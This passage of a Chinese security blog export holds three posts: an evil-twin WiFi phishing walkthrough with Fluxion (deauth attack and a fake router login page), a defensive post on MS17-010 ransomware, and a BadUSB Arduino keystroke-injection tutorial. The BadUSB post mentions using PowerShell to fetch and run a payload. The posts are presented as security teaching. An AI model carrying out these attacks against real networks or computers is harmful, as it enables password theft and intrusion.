alt></p>\n<p>我们可以选择默认路径，直接回车。</p>\n<p>然后选择抓取握手包的方式。 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-113.jpg\" alt></p>\n<p>选择我们攻击ap的方式，第一个是使用默认aireplay来攻所有的客户端，第二个则是使用mdk3来攻击所有的客户端。</p>\n<p><img src=\"/images/pasted-114.jpg\" alt></p>\n<p>选择之后会同时开启2个小窗口，一个来ddos攻击ap，第二个来抓取握手包。  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-115.jpg\" alt></p>\n<p>如果抓取到握手包了右上角会有显示。 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-116.jpg\" alt></p>\n<p>这个时候可以直接关掉小窗口了，然后查看握手包。    <strong>↓</strong></p>\n<p><img src=\"/images/pasted-117.jpg\" alt></p>\n<p>来创建一个ssl证书。<strong>↓</strong></p>\n<p><img src=\"/images/pasted-118.jpg\" alt></p>\n<p>开启web服务。<strong>↓</strong></p>\n<p><img src=\"/images/pasted-119.jpg\" alt></p>\n<p>选择路由器的登录界面，在我们国内使用的tp-link比较多，我们可以选择tp-link。 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-120.jpg\" alt></p>\n<p>完毕之后会同时开启4个窗口，一个dhcp来分配ip，一个用来监听连接进钓鱼ap的客户端，一个来把所有请求解析到本地，最后一个来ddos目标的wifi。 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-121.jpg\" alt></p>\n<p>这个时候的客户端呢，用户会连接不上原wifi，而会自动连上我们的钓鱼wifi，而且一连上wifi就会自动打开网页，进入我们的钓鱼页面。 <strong>↓</strong></p>\n<p><img src=\"/images/Screenshot_2017-05-07-22-04-22.jpg\" alt></p>\n<p>同时浏览器也会提示用户登录wifi。  <strong>↓</strong></p>\n<p><img src=\"/images/Screenshot_2017-05-07-22-04-16.jpg\" alt></p>\n<p>用户输入密码后，会根据抓到的握手包来匹配正确密码。 <strong>↓</strong></p>\n<p><img src=\"/images/Screenshot_2017-05-07-22-05-20.jpg\" alt></p>\n<p>直到用户输入正确密码后，程序停止。</p>\n<p><img src=\"/images/Screenshot_2017-05-07-22-05-50.jpg\" alt></p>\n<p><img src=\"/images/pasted-122.jpg\" alt></p>\n<h3 id=\"末尾\"><a href=\"#末尾\" class=\"headerlink\" title=\"末尾\"></a>末尾</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外破解wifi还有使用reaver来穷举pin码，只有ap开着wps，并且没有做防pin的处理，那么可以百分百破解得到密码。但是不知道是不是我这个网卡原因，一直pin失败，所有ap都是一样的。等我解决这个问题后再来发布关于pin码的文章好了。</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，我在之前的文章中说过抓握手包破解，这里说一下社工钓鱼来破解得到wifi密码。","more":"</p>\n<h4 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h4><ul>\n<li>抓取握手包</li>\n<li>创建一个和目标wifi同名的ap热点，</li>\n<li>开启一个web服务，创建一个钓鱼的web页面，要求用户输入wifi密码</li>\n<li>模拟dns服务，把所有的请求都解析到自己的ip中</li>\n<li>ddos目标ap，使用户连不上路由器</li>\n<li>用户连接不上wifi后就会自动连上我们的钓鱼wifi</li>\n<li>连上后就所有请求页面都会转到我们的钓鱼页面。</li>\n<li>用户输入wifi密码后通过抓取的握手包来匹配正确密码。</li>\n</ul>\n<p><strong>这里我们使用Fluxion（当然也有相同的WiFiPhisher）来完成上述的过程</strong></p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>首先把程序下载到本地</p>\n<pre><code>git clone https://github.com/FluxionNetwork/fluxion.git\n</code></pre><p>首先进入install目录中运行install，会自动把依赖的软件包自动安装好。  <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-106.jpg\" alt></p>\n<h3 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h3><p>安装完毕之后就可以直接开启fluxion了。  <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-107.jpg\" alt></p>\n<p>一开始选择语言，其中有中文，但是我还是建议使用英文的。</p>\n<p>选择语言后来扫描指定ap的信道。 <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-108.jpg\" alt></p>\n<p>第一个是扫描全部信道，第二个是扫描指定信道，我们选择扫描全部信道。</p>\n<p>选择之后会自动开启一个小窗口来扫描ap，如果扫描到了我们要的ap就ctrl+c强制停止掉。   <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-109.jpg\" alt></p>\n<p>停止扫描后会把刚刚我们扫描到的ap都显示出来，选择我们需要攻击的ap。    <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-110.jpg\" alt></p>\n<p>然后选择攻击方式。   <strong>↓</strong></p>\n<p><img src=\"/images/pasted-111.jpg\" alt></p>\n<p>第一个就是我上面说的伪装ap攻击。我们选第一个。</p>\n<p>选择后我们需要设置保存握手包保存路径。  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-112.jpg\" alt></p>\n<p>我们可以选择默认路径，直接回车。</p>\n<p>然后选择抓取握手包的方式。 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-113.jpg\" alt></p>\n<p>选择我们攻击ap的方式，第一个是使用默认aireplay来攻所有的客户端，第二个则是使用mdk3来攻击所有的客户端。</p>\n<p><img src=\"/images/pasted-114.jpg\" alt></p>\n<p>选择之后会同时开启2个小窗口，一个来ddos攻击ap，第二个来抓取握手包。  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-115.jpg\" alt></p>\n<p>如果抓取到握手包了右上角会有显示。 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-116.jpg\" alt></p>\n<p>这个时候可以直接关掉小窗口了，然后查看握手包。    <strong>↓</strong></p>\n<p><img src=\"/images/pasted-117.jpg\" alt></p>\n<p>来创建一个ssl证书。<strong>↓</strong></p>\n<p><img src=\"/images/pasted-118.jpg\" alt></p>\n<p>开启web服务。<strong>↓</strong></p>\n<p><img src=\"/images/pasted-119.jpg\" alt></p>\n<p>选择路由器的登录界面，在我们国内使用的tp-link比较多，我们可以选择tp-link。 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-120.jpg\" alt></p>\n<p>完毕之后会同时开启4个窗口，一个dhcp来分配ip，一个用来监听连接进钓鱼ap的客户端，一个来把所有请求解析到本地，最后一个来ddos目标的wifi。 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-121.jpg\" alt></p>\n<p>这个时候的客户端呢，用户会连接不上原wifi，而会自动连上我们的钓鱼wifi，而且一连上wifi就会自动打开网页，进入我们的钓鱼页面。 <strong>↓</strong></p>\n<p><img src=\"/images/Screenshot_2017-05-07-22-04-22.jpg\" alt></p>\n<p>同时浏览器也会提示用户登录wifi。  <strong>↓</strong></p>\n<p><img src=\"/images/Screenshot_2017-05-07-22-04-16.jpg\" alt></p>\n<p>用户输入密码后，会根据抓到的握手包来匹配正确密码。 <strong>↓</strong></p>\n<p><img src=\"/images/Screenshot_2017-05-07-22-05-20.jpg\" alt></p>\n<p>直到用户输入正确密码后，程序停止。</p>\n<p><img src=\"/images/Screenshot_2017-05-07-22-05-50.jpg\" alt></p>\n<p><img src=\"/images/pasted-122.jpg\" alt></p>\n<h3 id=\"末尾\"><a href=\"#末尾\" class=\"headerlink\" title=\"末尾\"></a>末尾</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外破解wifi还有使用reaver来穷举pin码，只有ap开着wps，并且没有做防pin的处理，那么可以百分百破解得到密码。但是不知道是不是我这个网卡原因，一直pin失败，所有ap都是一样的。等我解决这个问题后再来发布关于pin码的文章好了。</p>"},{"layout":"post","title":"防范ONION勒索病毒","date":"2017-05-13T05:03:16.000Z","comments":1,"_content":"\n### 前言\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;话说周末真的是搞大新闻时间，今早一醒就又被一个勒索病毒给刷了屏，稍微看了一下感觉没啥，就是一个古老的勒索软件利用了一个月前NSA美国安全局内部曝光的smb漏洞来传播，可怕的是这个NSA的这个漏洞非常厉害，所以传播的很快，我之前也发过NSA曝光的漏洞相关报道[(点我)](https://y00z.github.io/2017/04/15/diary-2017-0415-03/)，如果有设备中招了，病毒就会利用该设备来扫描内网中其他开445的设备并且攻击，很多学校机房和公用电脑都是年久失修的，而且学校都是一个大内网，所以学校是重灾区。<!--more-->\n\n![](http://image.3001.net/images/20170513/14946406784342.png)\n\n### 漏洞防御\n\n这个病毒就是利用之前NSA爆出的smb漏洞来传播的，所有防范这个病毒其实就是只要防范之前NSA爆出的smb漏洞就可以了。\n\n3个办法\n\n①控制面板→windows防火墙→高级设置→入站规则→新建规则→端口→tcp→下面输入“135,445”→阻止连接→再新建一次规则里面选udp\n\n②打上最新官方补丁下载地址：[https://technet.microsoft.com/zh-cn/library/security/MS17-010](https://technet.microsoft.com/zh-cn/library/security/MS17-010)\n\n③XP和win2003微软已经停止维护的可以使用 360的检测与修复工具 ：[https://dl.360safe.com/nsa/nsatool.exe](https://dl.360safe.com/nsa/nsatool.exe)\n\n### 文件修复\n\n<font color=\"#ff0000\">最新消息</font>\n\n出了两个文件恢复工具，并不是解密工具，只能恢复一部分文件\n第一个是360出的恢复工具。\n\n[http://weibo.com/ttarticle/p/show?id=2309404107129664487886](http://weibo.com/ttarticle/p/show?id=2309404107129664487886)\n\n第二个是不知名公司出的恢复工具\n\n[http://www.youxia.org/29083.html](http://www.youxia.org/29083.html)\n\n<font color=\"#ff0000\">最新消息,可恢复全部数据</font>\n\n阿里出了解密工具，可以完全恢复所有数据，前提是计算机没有关机过，原理就是加密后，key会存在内存中，可以在内存中找到key，和神器mimikatz原理差不多一样。\n\n[https://yq.aliyun.com/articles/86599?utm_content=m_21495](https://yq.aliyun.com/articles/86599?utm_content=m_21495)","source":"_posts/diary-2017-0513-01.md","raw":"---\nlayout: post\ntitle: 防范ONION勒索病毒\ndate: 2017-05-13 13:03:16\ncomments: true\ntags:\n\t- 安全攻防\n---\n\n### 前言\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;话说周末真的是搞大新闻时间，今早一醒就又被一个勒索病毒给刷了屏，稍微看了一下感觉没啥，就是一个古老的勒索软件利用了一个月前NSA美国安全局内部曝光的smb漏洞来传播，可怕的是这个NSA的这个漏洞非常厉害，所以传播的很快，我之前也发过NSA曝光的漏洞相关报道[(点我)](https://y00z.github.io/2017/04/15/diary-2017-0415-03/)，如果有设备中招了，病毒就会利用该设备来扫描内网中其他开445的设备并且攻击，很多学校机房和公用电脑都是年久失修的，而且学校都是一个大内网，所以学校是重灾区。<!--more-->\n\n![](http://image.3001.net/images/20170513/14946406784342.png)\n\n### 漏洞防御\n\n这个病毒就是利用之前NSA爆出的smb漏洞来传播的，所有防范这个病毒其实就是只要防范之前NSA爆出的smb漏洞就可以了。\n\n3个办法\n\n①控制面板→windows防火墙→高级设置→入站规则→新建规则→端口→tcp→下面输入“135,445”→阻止连接→再新建一次规则里面选udp\n\n②打上最新官方补丁下载地址：[https://technet.microsoft.com/zh-cn/library/security/MS17-010](https://technet.microsoft.com/zh-cn/library/security/MS17-010)\n\n③XP和win2003微软已经停止维护的可以使用 360的检测与修复工具 ：[https://dl.360safe.com/nsa/nsatool.exe](https://dl.360safe.com/nsa/nsatool.exe)\n\n### 文件修复\n\n<font color=\"#ff0000\">最新消息</font>\n\n出了两个文件恢复工具，并不是解密工具，只能恢复一部分文件\n第一个是360出的恢复工具。\n\n[http://weibo.com/ttarticle/p/show?id=2309404107129664487886](http://weibo.com/ttarticle/p/show?id=2309404107129664487886)\n\n第二个是不知名公司出的恢复工具\n\n[http://www.youxia.org/29083.html](http://www.youxia.org/29083.html)\n\n<font color=\"#ff0000\">最新消息,可恢复全部数据</font>\n\n阿里出了解密工具，可以完全恢复所有数据，前提是计算机没有关机过，原理就是加密后，key会存在内存中，可以在内存中找到key，和神器mimikatz原理差不多一样。\n\n[https://yq.aliyun.com/articles/86599?utm_content=m_21495](https://yq.aliyun.com/articles/86599?utm_content=m_21495)","slug":"diary-2017-0513-01","published":1,"updated":"2017-07-13T11:03:13.664Z","photos":[],"link":"","_id":"cjvhjxaaz000qiny2sh25d5o9","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;话说周末真的是搞大新闻时间，今早一醒就又被一个勒索病毒给刷了屏，稍微看了一下感觉没啥，就是一个古老的勒索软件利用了一个月前NSA美国安全局内部曝光的smb漏洞来传播，可怕的是这个NSA的这个漏洞非常厉害，所以传播的很快，我之前也发过NSA曝光的漏洞相关报道<a href=\"https://y00z.github.io/2017/04/15/diary-2017-0415-03/\">(点我)</a>，如果有设备中招了，病毒就会利用该设备来扫描内网中其他开445的设备并且攻击，很多学校机房和公用电脑都是年久失修的，而且学校都是一个大内网，所以学校是重灾区。<a id=\"more\"></a></p>\n<p><img src=\"http://image.3001.net/images/20170513/14946406784342.png\" alt></p>\n<h3 id=\"漏洞防御\"><a href=\"#漏洞防御\" class=\"headerlink\" title=\"漏洞防御\"></a>漏洞防御</h3><p>这个病毒就是利用之前NSA爆出的smb漏洞来传播的，所有防范这个病毒其实就是只要防范之前NSA爆出的smb漏洞就可以了。</p>\n<p>3个办法</p>\n<p>①控制面板→windows防火墙→高级设置→入站规则→新建规则→端口→tcp→下面输入“135,445”→阻止连接→再新建一次规则里面选udp</p>\n<p>②打上最新官方补丁下载地址：<a href=\"https://technet.microsoft.com/zh-cn/library/security/MS17-010\" target=\"_blank\" rel=\"noopener\">https://technet.microsoft.com/zh-cn/library/security/MS17-010</a></p>\n<p>③XP和win2003微软已经停止维护的可以使用 360的检测与修复工具 ：<a href=\"https://dl.360safe.com/nsa/nsatool.exe\" target=\"_blank\" rel=\"noopener\">https://dl.360safe.com/nsa/nsatool.exe</a></p>\n<h3 id=\"文件修复\"><a href=\"#文件修复\" class=\"headerlink\" title=\"文件修复\"></a>文件修复</h3><font color=\"#ff0000\">最新消息</font>\n\n<p>出了两个文件恢复工具，并不是解密工具，只能恢复一部分文件<br>第一个是360出的恢复工具。</p>\n<p><a href=\"http://weibo.com/ttarticle/p/show?id=2309404107129664487886\" target=\"_blank\" rel=\"noopener\">http://weibo.com/ttarticle/p/show?id=2309404107129664487886</a></p>\n<p>第二个是不知名公司出的恢复工具</p>\n<p><a href=\"http://www.youxia.org/29083.html\" target=\"_blank\" rel=\"noopener\">http://www.youxia.org/29083.html</a></p>\n<font color=\"#ff0000\">最新消息,可恢复全部数据</font>\n\n<p>阿里出了解密工具，可以完全恢复所有数据，前提是计算机没有关机过，原理就是加密后，key会存在内存中，可以在内存中找到key，和神器mimikatz原理差不多一样。</p>\n<p><a href=\"https://yq.aliyun.com/articles/86599?utm_content=m_21495\" target=\"_blank\" rel=\"noopener\">https://yq.aliyun.com/articles/86599?utm_content=m_21495</a></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;话说周末真的是搞大新闻时间，今早一醒就又被一个勒索病毒给刷了屏，稍微看了一下感觉没啥，就是一个古老的勒索软件利用了一个月前NSA美国安全局内部曝光的smb漏洞来传播，可怕的是这个NSA的这个漏洞非常厉害，所以传播的很快，我之前也发过NSA曝光的漏洞相关报道<a href=\"https://y00z.github.io/2017/04/15/diary-2017-0415-03/\">(点我)</a>，如果有设备中招了，病毒就会利用该设备来扫描内网中其他开445的设备并且攻击，很多学校机房和公用电脑都是年久失修的，而且学校都是一个大内网，所以学校是重灾区。","more":"</p>\n<p><img src=\"http://image.3001.net/images/20170513/14946406784342.png\" alt></p>\n<h3 id=\"漏洞防御\"><a href=\"#漏洞防御\" class=\"headerlink\" title=\"漏洞防御\"></a>漏洞防御</h3><p>这个病毒就是利用之前NSA爆出的smb漏洞来传播的，所有防范这个病毒其实就是只要防范之前NSA爆出的smb漏洞就可以了。</p>\n<p>3个办法</p>\n<p>①控制面板→windows防火墙→高级设置→入站规则→新建规则→端口→tcp→下面输入“135,445”→阻止连接→再新建一次规则里面选udp</p>\n<p>②打上最新官方补丁下载地址：<a href=\"https://technet.microsoft.com/zh-cn/library/security/MS17-010\" target=\"_blank\" rel=\"noopener\">https://technet.microsoft.com/zh-cn/library/security/MS17-010</a></p>\n<p>③XP和win2003微软已经停止维护的可以使用 360的检测与修复工具 ：<a href=\"https://dl.360safe.com/nsa/nsatool.exe\" target=\"_blank\" rel=\"noopener\">https://dl.360safe.com/nsa/nsatool.exe</a></p>\n<h3 id=\"文件修复\"><a href=\"#文件修复\" class=\"headerlink\" title=\"文件修复\"></a>文件修复</h3><font color=\"#ff0000\">最新消息</font>\n\n<p>出了两个文件恢复工具，并不是解密工具，只能恢复一部分文件<br>第一个是360出的恢复工具。</p>\n<p><a href=\"http://weibo.com/ttarticle/p/show?id=2309404107129664487886\" target=\"_blank\" rel=\"noopener\">http://weibo.com/ttarticle/p/show?id=2309404107129664487886</a></p>\n<p>第二个是不知名公司出的恢复工具</p>\n<p><a href=\"http://www.youxia.org/29083.html\" target=\"_blank\" rel=\"noopener\">http://www.youxia.org/29083.html</a></p>\n<font color=\"#ff0000\">最新消息,可恢复全部数据</font>\n\n<p>阿里出了解密工具，可以完全恢复所有数据，前提是计算机没有关机过，原理就是加密后，key会存在内存中，可以在内存中找到key，和神器mimikatz原理差不多一样。</p>\n<p><a href=\"https://yq.aliyun.com/articles/86599?utm_content=m_21495\" target=\"_blank\" rel=\"noopener\">https://yq.aliyun.com/articles/86599?utm_content=m_21495</a></p>"},{"layout":"post","title":"制作BadUSB","date":"2017-05-12T07:14:09.000Z","comments":1,"_content":"\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n\n### 正文\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BadUSB早在2014年底的PacSec会议上便已经提出，这是USB协议中的一个漏洞————USB设备可以伪装成为其他任何设备，例如输入设备、网卡等等。这个漏洞目前还没有得到修复，几乎可以说在有合适的脚本的情况下，只要能够插进去，没有什么是黑不掉的！<!--more-->\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;差不多的原理就是伪装成HID设备如键盘或者鼠标，然后模拟键盘按键来打开cmd执行powershell指令对电脑进行攻击，而且这种攻击是无法拦截的。\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;制作BadUsb有两个方法，一种是Arduino开发板，另一种PS2251-03的微处理器的U盘，可以在这里看U盘的[列表型号](https://github.com/brandonlw/Psychson/wiki/Known-Supported-Devices) ，这里我使用的第一种制作方法。\n(ps：我本来用的是第二种方法，买了指定型号的u盘，买回来后发现微处理器并不是PS2251-03微处理器，然后才换了第一种方法)\n\n\n#### 材料\n\n\t * Arduino Leonardo\n\t * Arduino IDE \n\t * micro usb数据线\n\nArduino Leonardo 可以去水深宝淘到。\n\nArduino IDE 下载地址：[https://www.arduino.cc/en/Main/Software](https://www.arduino.cc/en/Main/Software)\n\nArduino Leonardo **↓**\n\n ![](/images/pasted-123.jpg)\n\n拆开看看 **↓**\n\n![](/images/pasted-124.jpg)\n\n使用micro usb 安卓数据线就可以和电脑连接了  **↓**\n\n![](/images/pasted-125.jpg)\n\n##### Arduino IDE\n\n打开后默认是这样的  **↓**\n\n![](/images/pasted-126.jpg)\n\n同时需要把IDE菜单=>工具的两个选项选一下。 **↓**\n\n![](/images/pasted-127.jpg)\n\n\n这个选项需要电脑连接开发板后才有  **↓**\n\n![](/images/pasted-128.jpg)\n\n然后可以来编写代码了。 \n我们可以先来写一个hello world  **↓**\n\n```c\n#include<Keyboard.h> //包含键盘模块头文件\nvoid setup() {\n  // put your setup code here, to run once:\n  Keyboard.begin();//开始键盘通信\n  delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样\n  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题\n  Keyboard.release(KEY_CAPS_LOCK); //释放大写键\n  delay(500);\n  Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键\n  delay(500);\n  Keyboard.press('r');//按下r键\n  delay(500);\n  Keyboard.release(KEY_LEFT_GUI);//松掉win键\n  Keyboard.release('r');//松掉r键\n  delay(500);\n  Keyboard.println(\"cmd\");//输入cmd进入DOS\n  delay(500);\n  Keyboard.press(KEY_RETURN);  //按下回车键\n  Keyboard.release(KEY_RETURN); //释放回车键\n  delay(500);\n  Keyboard.println(\"echo hello world\");\n  Keyboard.press(KEY_RETURN);  //按下回车键\n  Keyboard.release(KEY_RETURN); //释放回车键\n  delay(500);\n  Keyboard.press(KEY_CAPS_LOCK); //按下大写键\n  Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键\n  delay(500);\n  Keyboard.end();//结束键盘通讯\n}\n\nvoid loop() {\n  // put your main code here, to run repeatedly:\n}\n\n```\n\n然后编译验证  **↓**\n\n![](/images/pasted-129.jpg)\n\n如果提示这个就说明编译验证成功了  **↓**\n\n![](/images/pasted-130.jpg)\n\n接下来就可以把代码上传到Arduino Leonardo，来完成BadUSB制作的最后一步。  **↓**\n\n![](/images/pasted-131.jpg)\n\n上传成功后会自动断开USB然后再次连接并且执行代码。\n\n会根据代码来依次执行，先按出win+r键，然后按出cmd 回车，最后输入echo hello world。\n\n### 总结\n\n当然我们可以执行powershell指令来下载自己的payload然后执行，或者其他一些代码。\n\n我这里放几个例子[https://github.com/Y00z/BadUSB](https://github.com/Y00z/BadUSB)。\n\n\n\n","source":"_posts/diary-2017-0512-01.md","raw":"---\nlayout: post\ntitle: 制作BadUSB\ndate: 2017-05-12 15:14:09\ncomments: true\ntags:\n\t- 安全攻防\n---\n\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n\n### 正文\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BadUSB早在2014年底的PacSec会议上便已经提出，这是USB协议中的一个漏洞————USB设备可以伪装成为其他任何设备，例如输入设备、网卡等等。这个漏洞目前还没有得到修复，几乎可以说在有合适的脚本的情况下，只要能够插进去，没有什么是黑不掉的！<!--more-->\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;差不多的原理就是伪装成HID设备如键盘或者鼠标，然后模拟键盘按键来打开cmd执行powershell指令对电脑进行攻击，而且这种攻击是无法拦截的。\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;制作BadUsb有两个方法，一种是Arduino开发板，另一种PS2251-03的微处理器的U盘，可以在这里看U盘的[列表型号](https://github.com/brandonlw/Psychson/wiki/Known-Supported-Devices) ，这里我使用的第一种制作方法。\n(ps：我本来用的是第二种方法，买了指定型号的u盘，买回来后发现微处理器并不是PS2251-03微处理器，然后才换了第一种方法)\n\n\n#### 材料\n\n\t * Arduino Leonardo\n\t * Arduino IDE \n\t * micro usb数据线\n\nArduino Leonardo 可以去水深宝淘到。\n\nArduino IDE 下载地址：[https://www.arduino.cc/en/Main/Software](https://www.arduino.cc/en/Main/Software)\n\nArduino Leonardo **↓**\n\n ![](/images/pasted-123.jpg)\n\n拆开看看 **↓**\n\n![](/images/pasted-124.jpg)\n\n使用micro usb 安卓数据线就可以和电脑连接了  **↓**\n\n![](/images/pasted-125.jpg)\n\n##### Arduino IDE\n\n打开后默认是这样的  **↓**\n\n![](/images/pasted-126.jpg)\n\n同时需要把IDE菜单=>工具的两个选项选一下。 **↓**\n\n![](/images/pasted-127.jpg)\n\n\n这个选项需要电脑连接开发板后才有  **↓**\n\n![](/images/pasted-128.jpg)\n\n然后可以来编写代码了。 \n我们可以先来写一个hello world  **↓**\n\n```c\n#include<Keyboard.h> //包含键盘模块头文件\nvoid setup() {\n  // put your setup code here, to run once:\n  Keyboard.begin();//开始键盘通信\n  delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样\n  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题\n  Keyboard.release(KEY_CAPS_LOCK); //释放大写键\n  delay(500);\n  Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键\n  delay(500);\n  Keyboard.press('r');//按下r键\n  delay(500);\n  Keyboard.release(KEY_LEFT_GUI);//松掉win键\n  Keyboard.release('r');//松掉r键\n  delay(500);\n  Keyboard.println(\"cmd\");//输入cmd进入DOS\n  delay(500);\n  Keyboard.press(KEY_RETURN);  //按下回车键\n  Keyboard.release(KEY_RETURN); //释放回车键\n  delay(500);\n  Keyboard.println(\"echo hello world\");\n  Keyboard.press(KEY_RETURN);  //按下回车键\n  Keyboard.release(KEY_RETURN); //释放回车键\n  delay(500);\n  Keyboard.press(KEY_CAPS_LOCK); //按下大写键\n  Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键\n  delay(500);\n  Keyboard.end();//结束键盘通讯\n}\n\nvoid loop() {\n  // put your main code here, to run repeatedly:\n}\n\n```\n\n然后编译验证  **↓**\n\n![](/images/pasted-129.jpg)\n\n如果提示这个就说明编译验证成功了  **↓**\n\n![](/images/pasted-130.jpg)\n\n接下来就可以把代码上传到Arduino Leonardo，来完成BadUSB制作的最后一步。  **↓**\n\n![](/images/pasted-131.jpg)\n\n上传成功后会自动断开USB然后再次连接并且执行代码。\n\n会根据代码来依次执行，先按出win+r键，然后按出cmd 回车，最后输入echo hello world。\n\n### 总结\n\n当然我们可以执行powershell指令来下载自己的payload然后执行，或者其他一些代码。\n\n我这里放几个例子[https://github.com/Y00z/BadUSB](https://github.com/Y00z/BadUSB)。\n\n\n\n","slug":"diary-2017-0512-01","published":1,"updated":"2017-05-13T11:01:49.397Z","photos":[],"link":"","_id":"cjvhjxab0000riny253jwjnge","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BadUSB早在2014年底的PacSec会议上便已经提出，这是USB协议中的一个漏洞————USB设备可以伪装成为其他任何设备，例如输入设备、网卡等等。这个漏洞目前还没有得到修复，几乎可以说在有合适的脚本的情况下，只要能够插进去，没有什么是黑不掉的！<a id=\"more\"></a></p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;差不多的原理就是伪装成HID设备如键盘或者鼠标，然后模拟键盘按键来打开cmd执行powershell指令对电脑进行攻击，而且这种攻击是无法拦截的。</p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;制作BadUsb有两个方法，一种是Arduino开发板，另一种PS2251-03的微处理器的U盘，可以在这里看U盘的<a href=\"https://github.com/brandonlw/Psychson/wiki/Known-Supported-Devices\" target=\"_blank\" rel=\"noopener\">列表型号</a> ，这里我使用的第一种制作方法。<br>(ps：我本来用的是第二种方法，买了指定型号的u盘，买回来后发现微处理器并不是PS2251-03微处理器，然后才换了第一种方法)</p>\n<h4 id=\"材料\"><a href=\"#材料\" class=\"headerlink\" title=\"材料\"></a>材料</h4><pre><code>* Arduino Leonardo\n* Arduino IDE \n* micro usb数据线\n</code></pre><p>Arduino Leonardo 可以去水深宝淘到。</p>\n<p>Arduino IDE 下载地址：<a href=\"https://www.arduino.cc/en/Main/Software\" target=\"_blank\" rel=\"noopener\">https://www.arduino.cc/en/Main/Software</a></p>\n<p>Arduino Leonardo <strong>↓</strong></p>\n<p> <img src=\"/images/pasted-123.jpg\" alt></p>\n<p>拆开看看 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-124.jpg\" alt></p>\n<p>使用micro usb 安卓数据线就可以和电脑连接了  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-125.jpg\" alt></p>\n<h5 id=\"Arduino-IDE\"><a href=\"#Arduino-IDE\" class=\"headerlink\" title=\"Arduino IDE\"></a>Arduino IDE</h5><p>打开后默认是这样的  <strong>↓</strong></p>\n<p><img src=\"/images/pasted-126.jpg\" alt></p>\n<p>同时需要把IDE菜单=&gt;工具的两个选项选一下。 <strong>↓</strong></p>\n<p><img src=\"/images/pasted-127.jpg\" alt></p>\n<p>这个选项需要电脑连接开发板后才有  